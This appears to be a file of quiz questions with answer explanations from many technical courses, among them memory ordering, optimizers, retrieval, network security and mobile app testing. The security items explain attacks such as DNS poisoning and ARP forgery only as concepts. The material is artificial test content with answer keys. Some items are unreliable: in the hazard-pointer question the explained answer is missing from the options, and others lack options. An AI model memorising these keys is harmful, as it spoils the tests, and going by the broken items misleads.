courseTitle: Memory ordering (acquire/release, seq_cst) and the C++/Rust model
lessonTitle: SeqCst, fences, and when you need one global order
question: Why does `Arc::drop` use Release on every `fetch_sub`, rather than only on the one that reaches zero?
options: Because Release makes the decrement faster on x86
Because no thread knows in advance whether its decrement is the last, and every non-final owner's uses must happen-before the deletion
Because fetch_sub cannot be Relaxed
Because SeqCst is required for reference counts
explain: Whichever thread frees the data needs a happens-before edge from every other owner's last use. Each non-final owner provides that by releasing on its decrement; the final owner acquires (via the fence) before deleting. The Acquire is only needed by the one thread that sees old == 1.

courseTitle: Memory reclamation: epochs, hazard pointers, RCU
lessonTitle: Hazard pointers: announce exactly what you are reading
question: N = 8 threads, K = 2 hazard pointers each, R = 2H. What is the maximum number of retired-but-unfreed nodes, and the minimum freed per scan?
options: 16 and 8
32 and 16
128 and 8
explain: H = N x K = 16, so R = 32. The bound is N x R = 8 x 32 = 256 waiting nodes. Each scan checks 32 nodes and at most 16 can be protected, so it frees at least R minus H = 16.

courseTitle: Memory safety bugs: overflows, use-after-free and friends
lessonTitle: What memory safety means and why breaking it is dangerous
question: A function keeps a pointer to a buffer, frees the buffer, and an hour later reads through the pointer. Which family is this?
options: Temporal: the read happens after the object's lifetime ended
Spatial: the read is past the end of the buffer
Type: the buffer is read as the wrong type
Not a memory safety bug, since the address is still valid
explain: The address is the same one that was once valid, so it is not about bounds. It is about time: the object no longer exists and the memory may belong to something else now. That is a temporal bug, usually called use-after-free.

courseTitle: Memory safety bugs: overflows, use-after-free and friends
lessonTitle: Out-of-bounds reads: Heartbleed and why leaks matter
question: Why could Heartbleed leak private keys even though the bug never wrote to memory?
options: It replaced the key with a known value
TLS sends keys in heartbeats
It crashed the server so keys were dumped to disk
It copied up to 64 KB of whatever was next to the heartbeat buffer into the reply, and server memory held keys and passwords
explain: An over-read copies neighbouring memory out. Whatever the server process had in memory near that buffer, including key material and other users' data, could appear in the reply. No write and no crash was needed.

courseTitle: Memory safety bugs: overflows, use-after-free and friends
lessonTitle: Uninitialized memory and type confusion
question: Which is the best fix for show() in the tagged-union example?
options: Cast `v->u.num` to a pointer explicitly
Switch on `v->kind` and read only the member the tag names; reject unknown tags
Make the union bigger
Catch the crash with a signal handler
explain: The bug is reading a member the tag does not vouch for. Checking the tag first removes the confusion; casting just hides it, and catching the crash leaves a chosen-address read possible.

courseTitle: Metric learning and re-identification
lessonTitle: Why re-ID needs an embedding space, not a classifier
question: With contrastive loss and margin m = 1, a dissimilar pair sits at distance D = 0.4. What is its loss?
explain: The dissimilar term is 0.5 x max(0, 1 - 0.4)^2 = 0.5 x 0.36 = 0.18. If the pair were at D = 1.2 the loss would be 0.

courseTitle: Microbenchmarking pitfalls: when the number lies
lessonTitle: When the optimizer deletes the code you meant to time
question: A colleague's benchmark reports 0.25 ns per call for a function that parses a 40-byte string. What is the most likely explanation?
options: The compiler removed or folded the work, so the loop no longer parses anything
The parser is vectorized and handles many bytes per cycle
The timer has 1 ns resolution, so the number is rounded down
The string fits in L1 cache, so parsing is nearly free
explain: Parsing 40 bytes cannot finish in about one clock cycle, even with vector instructions and a warm L1 cache. Timer resolution is not the issue either: the total time is divided by many iterations. An impossible per-call time almost always means the result was unused (dead code) or the input was a compile-time constant (folding).

courseTitle: Microbenchmarking pitfalls: when the number lies
lessonTitle: Measurement bias: layout, link order and JIT profiles
question: Mytkowicz et al. found that link order alone moved perlbench's -O3 speedup between 0.92 and 1.10. What does that imply for a single-build comparison of two compiler flags?
options: Only that more repetitions are needed
Link order matters only for programs as large as perlbench
A single build is one sample of memory layout, so its result can favor either flag regardless of how many times it is run
The Core 2 was faulty
explain: Each point in their data was reproducible across runs, so repetitions do not help: the bias is fixed by the build's layout. Stabilizer's authors put it directly: a single binary is one sample from the space of program layouts. Mytkowicz et al. saw such effects on every machine they tried, including a simulator.

courseTitle: Miles: production RL post-training forked from slime
lessonTitle: Token-in-token-out: train on the tokens you actually sampled
question: A run sets --rollout-top-p 0.95 and --rollout-top-k 64, so sampling-support replay is on. It also wants a reference-model KL loss and on-policy distillation. What does Miles do?
options: Runs, but computes KL over the support only
Runs, and silently turns replay off for KL tokens
Refuses to start: replay exposes only the support-normalized score, and KL and OPD need a full-vocabulary score
Refuses because top-p needs top-k left at its default
explain: The replay docs list this as the current objective limitation: the loss interface carries only the support-normalized actor score, so Miles rejects --use-kl-loss, a nonzero --kl-coef and --use-opd with replay. A finite top-p actually requires a positive top-k, so the run's top-k setting is correct.

courseTitle: Miles: production RL post-training forked from slime
lessonTitle: LoRA RL and the multi-LoRA training service
question: Why does the multi-LoRA service register every saved adapter as an immutable, versioned name instead of overwriting one adapter slot on the engines?
options: Because SGLang cannot unload adapters once loaded
To save disk space on shared storage
So sampling that started on one version finishes on those exact weights while the tenant keeps training and saving newer versions
Because Tinker clients can only sample once per adapter
explain: Clients sample asynchronously while they keep training. If a save overwrote the live adapter, an in-flight trajectory could switch weights mid-generation, and its tokens would come from no single policy. Versioned, immutable snapshots keep each sample's behavior policy well defined.

courseTitle: ML for systems: learned indexes, caching and scheduling
lessonTitle: Decima: learning a cluster scheduler with reinforcement learning
question: Two training episodes use the same policy and the same actions early on, but in one a burst of 50 large jobs arrives at minute 5. What problem does this cause for policy gradient, and what fixes it?
options: The policy network runs out of memory; batch smaller
The reward becomes positive; clip it
The GNN cannot handle 50 DAGs; cap the number of jobs
Rewards differ for reasons unrelated to the action, inflating gradient variance; compare each episode against a baseline computed from episodes with the same arrival sequence
explain: The burst lowers every later reward regardless of what the agent did, so the advantage term blames or credits actions for luck. Decima's input-dependent baseline averages only over episodes that saw the same job arrivals, removing that noise from the comparison.

courseTitle: Mobile app security testing: OWASP MASVS and MASTG
lessonTitle: Static analysis: decompile, read the manifest, search the code
question: Which part of the Tea incident could a static review of the Android app have surfaced before attackers did?
options: The 4chan posts
The number of affected users
The legacy storage bucket's address, which was written in the app, giving a reviewer an endpoint to test for anonymous access
That the app blocks screenshots
explain: 404 Media matched the exposed bucket's URL to one found in Tea's Android app. Listing every endpoint a release build references, and testing each for unauthenticated access, is exactly the static-plus-backend step that finds this class of exposure.

courseTitle: Mobile app security testing: OWASP MASVS and MASTG
lessonTitle: Content providers and shared files: from URI grants to Dirty Stream
question: Why is the canonical-path check in SafeCache written against `INBOX.getCanonicalPath() + File.separator` rather than just the inbox path?
options: Without the trailing separator, a sibling directory such as 'inbox-evil' would also start with the inbox path and pass the check
Because getCanonicalPath removes the last character
Because Android paths use backslashes
It makes no difference; it is style
explain: String prefix checks on paths must end at a directory boundary. '/files/inbox-evil/x' starts with '/files/inbox' but not with '/files/inbox/'. Android uses forward slashes; File.separator is '/' there.

courseTitle: Mobile app security testing: OWASP MASVS and MASTG
lessonTitle: Resilience and attestation: what an app can prove, and what it cannot
question: A banking app's backend accepts transfers only when the request carries an integrity token whose verdict is PLAY_RECOGNIZED and MEETS_DEVICE_INTEGRITY, but it never sets or checks requestHash. What can an attacker on a genuine device with the genuine app do?
options: Nothing, because the token proves the app is genuine
Only read their own balance
Obtain a valid token from the genuine app and attach it to a different, edited request, since the token is bound to the device but not to this request
Forge tokens offline with the app's public key
explain: Google's documentation: without requestHash the token is bound only to the device, not to the specific request. Hash the transfer's fields into requestHash and compare on the server. Tokens are signed and encrypted by Google, so forging them offline is not the realistic route.

courseTitle: Multi-head latent attention (MLA)
lessonTitle: Absorbing the up-projections: attend in latent space
question: In the toy, the absorbed query for head 2 is (1.5, 0.5). What is head 2's raw score against token 3, whose latent is $c_3 = (1, 0.5)$?
explain: $1.5 \times 1 + 0.5 \times 0.5 = 1.75$, the same as $q \cdot k_3$ with the rebuilt key $k_3 = (1.5, 0.5)$: $1 \times 1.5 + 0.5 \times 0.5 = 1.75$.

courseTitle: Multi-head latent attention (MLA)
lessonTitle: MLA in production: kernels, prefill, parallelism, FP8 cache
question: A blog says MLA alone cut DeepSeek-V2's KV cache by 93.3% vs MHA. What is wrong with that claim?
options: 93.3% is measured against DeepSeek 67B (a GQA model) for the deployed system, which also quantizes the cache; MLA vs MHA in matched models was 14% to 4% of the MHA cache
Nothing, that is exactly what the paper measured
MLA increases the KV cache
93.3% refers to training cost
explain: The abstract compares V2 to DeepSeek 67B. The matched MHA vs MLA comparison is Table 9: 15.6K vs 110.6K and 34.6K vs 860.2K elements per token.

courseTitle: Serving many LoRA adapters on one base model
lessonTitle: Merge, swap, or compute the adapter on the fly
question: A support-bot product uses a single LoRA fine-tune and is judged on per-token latency. What should it do?
options: Run an unmerged multi-LoRA server with max_loras (the number of adapters allowed in one batch) set high
Swap the adapter in and out every batch
Serve the base model without the adapter
Merge the adapter into the base weights and serve that model
explain: With one adapter there is nothing to batch across, so the unmerged add-on is pure overhead. Merging gives the base model's cost per token, which is also what S-LoRA's single-adapter ablation found.

courseTitle: Serving many LoRA adapters on one base model
lessonTitle: Multi-LoRA in vLLM and LoRAX, and the cost model
question: You serve adapters of rank 8 and 16 with vLLM but set --max-lora-rank 256. What is the main consequence?
options: Requests fail because ranks must match exactly
Adapters are automatically retrained at rank 256
Throughput improves because larger slots are faster
GPU memory is reserved for rank-256 slots, wasting space that the KV cache could use
explain: vLLM preallocates each of the max_loras slots at max_lora_rank and pads smaller adapters into them. The docs warn that setting it much higher than needed wastes memory and can hurt performance.

courseTitle: Multi-query retrieval: many phrasings, one fused result
lessonTitle: Union versus RRF, and deduplicating by document id
question: Your index stores 3 chunks per web page. Fusion is keyed by chunk id and the top-5 after RRF holds 3 chunks of the same page. What is the most direct fix?
options: Fuse by source document id (or collapse chunks of one page) before truncating to 5
Raise k from 60 to 600
Generate more paraphrases
Switch from RRF to an unranked union
explain: The slots are being spent on near-duplicates of one source. Keying fusion or a post-fusion collapse by source id frees slots for other documents. Changing k or adding phrasings does not address what counts as a duplicate.

courseTitle: Multi-stage retrieval: designing the retrieve-then-rerank cascade
lessonTitle: Why one scorer cannot be both cheap and accurate
question: Under Wang, Lin and Metzler's cost model, you double k0 from 500 to 1000 in a BM25 plus monoBERT pipeline. What happens to monoBERT's cost per query?
options: It stays the same, because monoBERT runs once per query
It grows by about log 2
It roughly doubles, because cost is unit cost times the number of documents scored
It quadruples
explain: monoBERT scores each candidate independently, so its cost is U x k0. Nogueira et al. report exactly this: latency increases linearly with the number of candidates, while quality shows diminishing returns.

courseTitle: Multi-stage retrieval: designing the retrieve-then-rerank cascade
lessonTitle: LLM listwise reranking and distilling it into cheaper stages
question: Your LLM listwise reranker on the top 100 meets quality targets but costs too much per query. Which change follows the cascade principle best?
options: Run the LLM on the top 100 but with a random initial order to avoid bias
Drop stage 1 and let the LLM read the whole corpus in windows
Let a distilled cross-encoder rerank the 100 and send only its top 20 to the LLM in one window
Increase the step size to 20 so windows no longer overlap
explain: Put the cheap model where the list is long and the expensive model where it is short: one LLM window instead of 9 calls. RankGPT's own GPT-4-on-top-30 result follows the same pattern. Random initial order hurt in the paper, and s = w removes the overlap that carries good passages forward.

courseTitle: Multi-token prediction: training GPTs to look ahead
lessonTitle: DeepSeek-V3: sequential MTP modules with a full causal chain
question: Why did the DeepSeek-V3 ablation conclude that MTP improved the model itself rather than just adding capacity?
options: The MTP models had more active parameters at inference
The module was discarded at inference, so the evaluated networks had identical cost and shape
MTP models were trained on more tokens
Only benchmarks that MTP helped were reported
explain: During evaluation the MTP module is dropped, so baseline and MTP models run the same main network at the same cost. The difference comes from how the shared weights were trained. The table even includes a regression (MMLU at large scale).

courseTitle: Muon, Shampoo and SOAP: optimizers that treat weights as matrices
lessonTitle: Why a weight matrix is not a bag of independent numbers
question: Why is full-matrix AdaGrad not used for a $4096 \times 4096$ linear layer?
options: Its preconditioner has about 2.8 x 10^14 entries (around 1.1 PB in fp32), far beyond any accelerator's memory
It diverges on non-convex losses, so it only works for linear models
It needs the Hessian, which backpropagation cannot provide
It ignores correlations between parameters, so it is no better than Adam
explain: The preconditioner is $mn \times mn$ with $mn \approx 1.68 \times 10^7$, so it has about $2.8 \times 10^{14}$ entries. It uses gradient outer products, not the Hessian, and it captures *all* correlations; the problem is purely size and the $O(m^3 n^3)$ cost of its inverse root.

courseTitle: Muon, Shampoo and SOAP: optimizers that treat weights as matrices
lessonTitle: SOAP: run Adam in the coordinates Shampoo discovers
question: In SOAP, what happens if you force $Q_L = I$ and $Q_R = I$ for a layer?
options: The layer is trained with plain Adam
The layer is trained with Muon
The layer is frozen
The layer is trained with full-matrix AdaGrad
explain: With identity rotations, $G' = G$ and SOAP's inner step is an ordinary Adam step in the original coordinates. That is exactly what the paper does on very large sides such as the vocabulary dimension: it skips the rotation there because an $m \times m$ eigenbasis would be too costly.

courseTitle: Muon, Shampoo and SOAP: optimizers that treat weights as matrices
lessonTitle: Choosing an optimizer: how much faster is it really?
question: A paper compares its optimizer to AdamW at the halfway checkpoint of a run with cosine learning-rate decay and reports 1.8x fewer steps to reach AdamW's halfway loss. What is the main problem?
options: Nothing, as long as both runs used the same batch size
Mid-run, neither learning rate has finished decaying, and loss curves can cross during the decay, so the ranking at the end may differ
Speedups must be measured in FLOPs, never in steps
Cosine decay is not allowed for second-order optimizers
explain: Wen et al. show loss curves of different optimizers crossing several times while the learning rate decays, so intermediate checkpoints can mislead. Compare at the end of each run's planned budget, ideally across several budgets. The unit matters too, but steps are a legitimate unit if reported as such.

courseTitle: muP: tune a small model, transfer hyperparameters to a large one
lessonTitle: The muP rules, layer by layer
question: Your model ties the input embedding and output unembedding weights. Which muP formulation from the paper fits best?
options: Table 3, because it is the main table
Neither; muP cannot be used with tied embeddings
Table 8, which gives input and output weights the same init and LR scaling and puts a 1/fan_in multiplier on the logits
SP with a smaller global learning rate
explain: Table 3 initializes output weights with variance $1/\text{fan\_in}^2$ but input weights with $1/\text{fan\_in}$, which conflicts if they are the same tensor. Table 8 is an equivalent formulation where all vector-like parameters share one rule and the width factor moves into a forward multiplier, so tying works. `MuSharedReadout` implements this.

courseTitle: muP: tune a small model, transfer hyperparameters to a large one
lessonTitle: Transferring across depth: branch multipliers, Depth-muP, CompleteP
question: Under CompleteP ($\alpha = 1$) with AdamW, you go from a 2-block proxy to a 32-block target at the same width. What happens to the residual branch multiplier and to the hidden-weight LR?
options: Multiplier 1/16, hidden LR divided by 4
Multiplier 1/16 (L/L_base = 16), hidden LR unchanged, since $L^{\alpha-1} = L^0$
Multiplier 1/4, hidden LR unchanged
No change to either; CompleteP only affects width
explain: CompleteP multiplies each branch by $(L/L_{base})^{-1} = 1/16$ and scales AdamW block LRs by $(L/L_{base})^{\alpha - 1} = 1$. Depth-muP ($\alpha = 1/2$) would instead use multiplier 1/4 and divide the block LRs by 4.

courseTitle: Mutexes, spinlocks and futexes: how locks really wait
lessonTitle: The futex: sleep on an address, wake by address
question: A waiter calls `FUTEX_WAIT(&word, 2)`, but by the time the kernel checks, `word` is 0. What happens?
options: The call returns immediately with EAGAIN and the thread does not sleep
The thread sleeps until the next FUTEX_WAKE
The kernel sets the word to 2 and then sleeps
The kernel wakes all other waiters on the word
explain: FUTEX_WAIT only sleeps if the word equals the expected value at the moment the kernel checks it. A mismatch means the state changed since the caller decided to wait, so it returns EAGAIN and the caller retries in user space.

courseTitle: MVCC and transaction isolation levels
lessonTitle: Read Committed vs Repeatable Read: when the snapshot is taken
question: Your app does `SELECT stock FROM items WHERE id = 7`, computes stock minus 1 in code, then `UPDATE items SET stock = <computed>` in the same Read Committed transaction. Two requests run this concurrently on stock = 5. What can happen?
options: Both requests block forever in a deadlock
Final stock is 3, because Read Committed serializes the updates
The second UPDATE fails with error 40001
Final stock is 4: one decrement is lost
explain: Both SELECTs can see 5, both compute 4. The second UPDATE waits for the first, then writes the constant 4 onto the new version. Fixes: write `SET stock = stock - 1`, lock the row with `SELECT ... FOR UPDATE`, or use Repeatable Read and retry on 40001.

courseTitle: Named entity recognition: tagging spans in text
lessonTitle: The task: pull typed spans out of running text
question: Why did the memorisation baseline reach precision 71.91 percent but recall only 50.90 percent on the CoNLL-2003 English test set?
options: Entity names are rare in newswire, so there was little to memorise
Names are an open class and the test set is from a different month, so a dictionary of training phrases matches only about half of its entities
The baseline used the wrong tag set and so could not represent multi-token spans
Precision and recall are measured on different entity types
explain: Train and dev are August 1996 Reuters news, test is December 1996. New stories mean new names, and a dictionary cannot find a name it never saw. When it does fire it is often right, which is why precision is much higher than recall.

courseTitle: Named entity recognition: tagging spans in text
lessonTitle: Transformer taggers and subword alignment
question: You fine-tune a BERT tagger and score 94 F1 on your own eval but 89 when a colleague scores the same predictions. The only difference is that you evaluated on WordPiece tokens and they evaluated on words. Why can your number be higher?
options: WordPiece tokens are easier to classify than words
You scored a different gold sequence, since masked continuation pieces and specials change the entity set and the counts
Scoring on pieces double counts true positives but not false positives
The discrepancy means the alignment code is broken
explain: The metric counts spans over whatever unit you give it. Pieces and words are different sequences with different entity boundaries, so the two runs are measuring different problems. Only the word-level number is comparable to published results.

courseTitle: Nation-state cyber operations and cyber conflict
lessonTitle: Doctrine in public: persistent engagement and responsible cyber power
question: Which statement best captures 'persistent engagement' as USCYBERCOM describes it?
options: Waiting for an attack and then retaliating with an equal cyber attack
Operating continuously, close to where adversaries prepare, to expose and counter their activity before it reaches US networks
Publishing doctrine to deter adversaries without conducting operations
Defending only US military networks from inside their perimeter
explain: The quoted Vision speaks of defending forward 'as close as possible to the origin of adversary activity' and of continuous engagement that imposes friction and costs. It is not a tit-for-tat retaliation doctrine, nor purely declaratory, nor limited to perimeter defence.

courseTitle: Nation-state cyber operations and cyber conflict
lessonTitle: Case: hack-and-leak and the 2016 GRU indictment
question: In the clustering script, why does the mail relay end up in the same cluster as the leak site?
options: Because wallet-B paid for the relay and also topped up wallet-A, which paid for the leak site
Because both are hosted at the same address
Because the script merges every item that costs money
Because the relay and the leak site have similar domain names
explain: Union-find merges items connected by any chain of payments: relay to wallet-B, wallet-B to wallet-A, wallet-A to the leak site. The unrelated shop paid by wallet-C stays separate, so the script does not merge everything.

courseTitle: Nation-state cyber operations and cyber conflict
lessonTitle: North Korea's revenue operations: banks, crypto and IT workers
question: In the laptop-farm schemes DOJ describes, what job did the KVM switches do?
options: They let workers abroad control company laptops remotely, so the laptops appeared to be used from inside the US
They encrypted the stolen data before exfiltration
They mined cryptocurrency on the company's hardware
They hid the laptops from the company's asset inventory
explain: DOJ says facilitators hosted company laptops and connected them to KVM hardware 'designed to allow for remote access'. The laptop's location is real; the person at the keyboard is not where the company thinks. Nothing describes encryption, mining or hiding from inventory.

courseTitle: Native sparse attention: NSA and DeepSeek Sparse Attention
lessonTitle: Three branches: compress, select, and slide
question: A model must copy the token that appeared 3 positions ago. Which NSA branch is designed to make this easy, and why is it a separate branch?
options: Compression, because it summarizes every token
Selection, because top-n scoring always ranks the most recent block first
Sliding window, because local patterns are learned fastest and a dedicated branch keeps them from shortcutting the long-range branches
None; NSA cannot attend to recent tokens exactly
explain: The window branch attends to the last $w$ tokens in full. The paper isolates it because local patterns adapt quickly and would otherwise dominate the learning signal of the compression and selection branches.

courseTitle: Native sparse attention: NSA and DeepSeek Sparse Attention
lessonTitle: Write NSA and DSA as masked attention and test them against dense
question: Your NSA reimplementation, with n large enough to select every block and gates fixed to (0, 1, 0), differs from dense causal attention, and the error appears inside every selection block except at its last token. What is the most likely bug?
options: The selected block mask was not intersected with the causal mask, so queries see later tokens of their own block
The compression stride d is wrong
The gates should be a softmax, not sigmoids
The window w is too small
explain: The block holding the query is only partly in the past. Without the token-level causal mask, each query attends to later tokens of its own block; only the block's last token has no later tokens inside it. Compression stride and window do not affect the selection branch output, and the gates are fixed in this test.

courseTitle: Near-duplicate image search with perceptual hashes
lessonTitle: pHash: hashing the low frequencies of a DCT
question: Why does Krawetz's pHash leave the DC term out of the mean it thresholds against?
options: Because the DC term is usually far larger than the other coefficients and would distort the average, and it only encodes overall brightness
Because the DC term is always negative
Because the DCT does not define a DC term
To make the hash 63 bits instead of 64
explain: The DC term is the flat component, the overall brightness. In the toy it is 25804 while the next largest magnitude is 3491; including it in a mean would drag the threshold upward. Krawetz quotes pHash author David Starkweather: leaving it out excludes flat color information from the hash.

courseTitle: NeMo RL: NVIDIA's Ray-based post-training library
lessonTitle: One controller, many RL Actors: the NeMo RL architecture
question: A teammate wants to move a GRPO run from 1 GPU to 64 GPUs. Which part should not need to change?
options: The cluster section of the YAML config
The resource reservation made by RayVirtualCluster
The body of the grpo_train loop
The number of worker processes in each RayWorkerGroup
explain: The loop calls interfaces such as generate, get_logprobs and train. Scaling changes the cluster config, the placement groups and the number of workers, but the controller logic stays the same.

courseTitle: NeMo RL: NVIDIA's Ray-based post-training library
lessonTitle: Colocated vs non-colocated generation, and how weights are refit
question: You turn on `grpo.async_grpo.enabled: true` but leave colocated generation on (`colocated.enabled: true`) with the vLLM backend. What does the async guide say?
options: It works; async only changes the loss
Set max_trajectory_age_steps to 0 instead
Switch the training backend to Automodel
Disable colocated inference: async mode with vLLM needs dedicated generation resources
explain: Async mode overlaps generation and training, which cannot happen on GPUs that must take turns. The async guide lists disabling colocated inference as required for the vLLM backend.

courseTitle: NeMo RL: NVIDIA's Ray-based post-training library
lessonTitle: Running for real: metrics, checkpoints, export and a multi-node recipe
question: A run with save_period: 10 crashes at step 37. You rerun the same command with the same checkpoint_dir. What happens?
options: It starts again from step 0 because the run did not finish
It resumes from step_30: weights, optimizer, step counter and dataloader position, so steps 31 to 37 are redone
It resumes from the best checkpoint by val:accuracy, which may be older than step_30
It resumes at step 37 from the logs
explain: Setup calls get_latest_checkpoint_path and restores the newest step_N, which retention always keeps. keep_top_k decides which older checkpoints survive, not where training resumes. Work after the last save is lost.

courseTitle: Network attacks and defences
lessonTitle: DNS cache poisoning: the race and the birthday maths
question: Using RFC 5452's model, which change does NOT reduce an attacker's chance of poisoning a record?
options: Lowering the record's TTL so that wrong data expires sooner
Randomising the source port of each query
Raising the record's TTL
Never sending two identical queries at once
explain: A shorter TTL means the record leaves the cache more often, which gives the attacker more windows to race in (more attempts, T/TTL). Random ports grow the haystack, merging duplicates keeps D at 1, and a longer TTL means fewer windows.

courseTitle: Network attacks and defences
lessonTitle: RPKI and route origin validation
question: A ROA says 203.0.113.0/24, maxLength 24, AS64500. A route for 203.0.113.0/25 arrives with origin AS64500. What is its ROV state?
options: Valid, because the origin AS matches
Valid, because /25 is inside /24
NotFound, because no ROA has exactly that prefix
Invalid, because the /25 is covered by the ROA but longer than its maxLength
explain: Covered (the /25 is inside the /24) but not matched, since 25 exceeds maxLength 24. Covered and not matched is Invalid, even with the right origin. This stops anyone, including a misconfigured owner, from announcing unexpected more specifics.

courseTitle: Network attacks and defences
lessonTitle: Flooding DNS and HTTP/2: Dyn 2016 and Rapid Reset 2023
question: Many unrelated websites failed on 21 October 2016 although their own servers were healthy. What did they have in common?
options: Their domains' authoritative DNS was served by Dyn, so resolvers could not look up their addresses
They all used HTTP/2
They were all infected with Mirai
They all used the same web host
explain: Mirai flooded Dyn's DNS servers. Users' resolvers could not get answers for those domains once cached records expired, so the sites were unreachable by name even though they were up.

courseTitle: Network attacks and defences
lessonTitle: Intrusion detection, network monitoring, and where to practise
question: You need to detect large outbound transfers from any internal host to the internet across a big network, cheaply. Which data source fits best?
options: Full packet capture on every switch port
Antivirus logs
Flow records (NetFlow or IPFIX) exported from border routers to a collector
DNSSEC signatures
explain: Flows summarise who sent how many bytes to whom without storing content, so they are cheap enough to keep for the whole network and long periods, and outbound volume per host is exactly what they measure.

courseTitle: Network traffic analysis: Wireshark, Zeek and Suricata
lessonTitle: Wireshark display filters: asking precise questions of packets
question: You want to hide all traffic to and from your own workstation, 10.0.0.5, to see everything else. Which filter does it according to the wireshark-filter manual?
options: ip.addr contains 10.0.0.5
explain: != means all values of ip.addr differ from 10.0.0.5, so any packet with 10.0.0.5 as source or destination is hidden. !== means any value differs, which keeps packets with one other address. ip.src != hides only one direction. contains cannot be used on IP addresses, which are atomic fields.

courseTitle: Network traffic analysis: Wireshark, Zeek and Suricata
lessonTitle: Suricata in depth: how rules match, EVE output and tuning
question: A rule has content:"admin"; content:".php"; distance:0; within:6;. Which payload makes it match?
options: /admin/login.php
/php/admin
/ADMIN.php
/admin.php
explain: After matching admin, .php must begin at or after the end of admin (distance:0) and lie entirely within the next 6 bytes (within:6). In /admin.php it follows immediately. In /admin/login.php it starts 6 bytes later and ends 10 bytes after admin, too far. /php/admin has no .php after admin, and /ADMIN.php fails because content is case-sensitive without nocase.

courseTitle: Network traffic analysis: Wireshark, Zeek and Suricata
lessonTitle: Finding beacons with robust statistics: the RITA approach
question: An implant's operator raises jitter from 10% to 50% to avoid detection. Using the formula in this lesson, roughly what happens to its timestamp score?
options: It falls from about 0.99 to about 0.33, the level of a person browsing
It rises to exactly 1.0
It becomes undefined because skewness divides by zero
It falls only slightly, from about 0.987 to about 0.917, so the pair still ranks as very regular
explain: With 1 minus j/(8 minus 4j): j = 0.1 gives 0.987 and j = 0.5 gives 0.917. Uniform jitter is symmetric, so skewness stays near 0 and only the MAD term drops. Bursty human traffic scores far lower because its gaps are heavily skewed and widely spread.

courseTitle: How networks work, seen by an attacker and a defender
lessonTitle: From bits on a wire to packets
question: Why do networks split data into packets instead of sending each message as one continuous stream?
options: Packets are encrypted by default, a continuous stream is not
Links can be shared by many conversations, and a lost piece can be resent on its own
Packets are required because cables can only carry one byte at a time
Splitting hides the content from attackers because no packet has the whole message
explain: Packet switching lets many users share links and makes loss cheap to repair. Packets are not encrypted by default, and splitting does not hide anything: an observer who sees all the packets reassembles the message as easily as the receiver does.

courseTitle: How networks work, seen by an attacker and a defender
lessonTitle: Joining a network: DHCP and ARP
question: Why does a single forged ARP reply work even if the victim never sent an ARP request?
options: Because RFC 826 updates an existing entry from any ARP packet whose sender IP is already in the table, before checking the opcode
Because ARP replies are encrypted and therefore trusted
Because switches forward ARP replies only to the router
Because DHCP tells the victim to accept it
explain: The reception algorithm in RFC 826 merges the sender's IP and MAC pair into the table first ("NOW look at the opcode!!" comes later). That was a deliberate efficiency choice for a trusted network, and it is why unsolicited replies are accepted.

courseTitle: How networks work, seen by an attacker and a defender
lessonTitle: DNS: from a name to an address, end to end
question: What made Kaminsky's 2008 technique so much more dangerous than earlier cache poisoning?
options: It broke the encryption on DNS
It required access to the root servers
Random uncached names allowed unlimited fresh races, and forged authority records hijacked a whole domain, not one name
It worked only against stub resolvers on Windows
explain: Earlier attacks lost a race and then had to wait out the TTL of the real answer. Asking for names that cannot be in cache removes that wait, and poisoning the delegation (NS plus glue) gives the attacker every name in the zone. Classic DNS has no encryption to break.

courseTitle: NUMA: placing memory and threads on multi-socket machines
lessonTitle: Why some memory is farther away than other memory
question: A program's working set fits entirely in each core's L1 and L2 caches. How much does NUMA placement of its data matter during the steady state?
